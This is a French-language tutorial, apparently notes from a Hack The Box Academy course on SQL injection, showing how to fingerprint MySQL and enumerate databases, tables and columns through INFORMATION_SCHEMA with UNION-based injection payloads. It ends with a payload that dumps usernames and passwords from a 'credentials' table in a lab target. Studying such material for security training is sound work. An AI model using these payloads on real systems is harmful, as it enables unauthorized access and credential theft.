---
title:  "Énumération de Bases de données"
category: "Exploitation"
tag: "Principes de base de l'injection SQL"
---
Auparavant, nous avons vu comment faire les injections SQL et leurs différents types. Cette section mettra tout cela à profit afin de recueillir des informations provenant des bases de données.

# Empreinte MySqL

Avant de faire de l'énumération d'une base de donnée, il est intéressant de savoir avec quel type de SGBD nous sommes en train d'intéragir. La raison pour cela est que chaque SGBD a ses différentes requêtes, et le connaître permettra de savoir quelles requêtes utiliser.

Nous pouvons deviner certains SGBD. Si par exemple le serveur web renvoie une réponse HTTP de **Apache ou Nginx**, on peut supposer que le serveur web tourne sur Linux, et que le SGBD est **MySQL**.\
Le même raisonnement s'applique avec le SGBD Microsoft si le serveur web est **IIS**, on peut supposer qu'il s'agit de **MSSQL**.

Comme nous ciblons MySQL dans ce module, on va prendre l'empreinte des bases de données MySQL.

| Payload          | Quand l'utiliser                                | Résultat attendu                                          | Mauvais résultat                                                       |
|------------------|-------------------------------------------------|-----------------------------------------------------------|------------------------------------------------------------------------|
| SELECT @@version | Lorsque nous disposons d'une requête complète   | Version de MySQL 'i.e. 10.3.22-MariaDB-1ubuntu1'          | Dans MSSQL, il renvoie la version de MSSQL. Erreur avec d'autres SGBD. |
| SELECT POW(1,1)  | Lorsque nous n'avons que des données numériques | 1                                                         | Erreur avec d'autres SGBD                                              |
| SELECT SLEEP(5)  | Sortie aveugle/absence de sortie                | Retarde la réponse de la page de 5 secondes et renvoie 0. | Ne retarde pas la réponse avec d'autres SGBD                           |


# Base de données INFORMATION_SCHEMA 

Afin d'extraire des données des tables en utilisant **UNION SELECT**, nous devons formuler correctement nos requête **SELECT**.
Pour cela, nous avons besoin des informations suivantes :
- La liste des bases de données.
- La liste des tables dans chaque base de données.
- La liste des colonnes de chaque table.

Pour obtenir toutes ces informations, nous devons utiliser la base de donnée [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html), qui contient les metadata à propros des BDD et des tables présent dans le serveur.

De plus, si nous devons faire un appel **SELECT** sur une table qui n'est pas dans la base de données courante, nous devons spécifier la base de données en question.
Dans le cas contraire, le **SELECT** essayera de trouver dans la base de données courante et ne trouvera pas les informations nécessaires.

Pour cela, il est nécessaire d'utiliser la syntaxe suivante :

```sql
SELECT * FROM my_database.users;
```

Avec les informations de la base **INFORMATION_SCHEMA**.

# SCHEMATA

Pour commencer l'énumeration, nous devons trouver les bases de données disponible sur le SGBD. La table **[SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html)** dans la base de données **INFORMATION_SCHEMA** contient les informations (dont les **noms des BDD**) à propos de toutes les bases du serveur. 

```sql
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
```
> Les 3 premières bases de données sont des BDD MySQL par défault, et sont présent dans n'importe quel serveur. On les ignore pour l'énumération.

On peut appliquer ce qu'on a vu dans la requête **UNION** pour récupérer les bases :

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
<center><img src="/assets/images/htbAcademy/SQLInjectionFundamentals/INFORMATIONSCHEMA1.png" alt="Alt text"></center>

Dans l'exemple, on voit 2 bases de données : ifreight et dev.
Faisons un **SELECT database()** pour découvrir la abse de donnée utilisée par l'application web pour récupéré les ports.
```sql
cn' UNION select 1,database(),2,3-- -
```
<center><img src="/assets/images/htbAcademy/SQLInjectionFundamentals/INFORMATIONSCHEMA2.png" alt="Alt text"></center>

On voit qu'il s'agit ici de la base **ifreight**.

# Table
Bien que dans l'exemple précédent, la base de données ifreight soit utilisée, il peut être intéréssant de voir ce que contient la base dev.

Pour cela nous devons récupéré les tables de la BDD **dev**.
La table **[TABLES](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html)** contient des informations sur toutes les tables de toutes les bases de données.

Deux colonnes sont intéréssantes :
- **TABLE_NAME** qui contient le nom des tables.
- **TABLE_SCHEMA** qui indique à quelle base de données la table appartient.

Dans notre exemple, le payload suivant serait fonctionnel :

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

<center><img src="/assets/images/htbAcademy/SQLInjectionFundamentals/INFORMATIONSCHEMA3.png" alt="Alt text"></center>

Ici, la table qui pourrait être intéréssante est **credentials**.

# Colonnes

Pour dump les données de la table **credentials** on a besoin de savoir le nom des colonnes de la tables, qui peuvent être trouvées dans la table **COLUMNS** de la base **INFORMATION_SCHEMA**.

Si on veut récupéré par exemple les colonnes, avec leurs tables associées et la base de données correspondante, sur l'exemple habituel cela donne :

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

<center><img src="/assets/images/htbAcademy/SQLInjectionFundamentals/INFORMATIONSCHEMA4.png" alt="Alt text"></center>

On peut voir qu'on a les colonnes **username et password** dans la table **credentials**, qui elle même appartient à la base de données **dev**.

# Données

Enfin, nous arrivons au moment qui nous intéresse, celui de récupérer les données (ici username et password de la table credential).

Avec la commande UNION, cela donne :
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```


<center><img src="/assets/images/htbAcademy/SQLInjectionFundamentals/INFORMATIONSCHEMA5.png" alt="Alt text"></center>




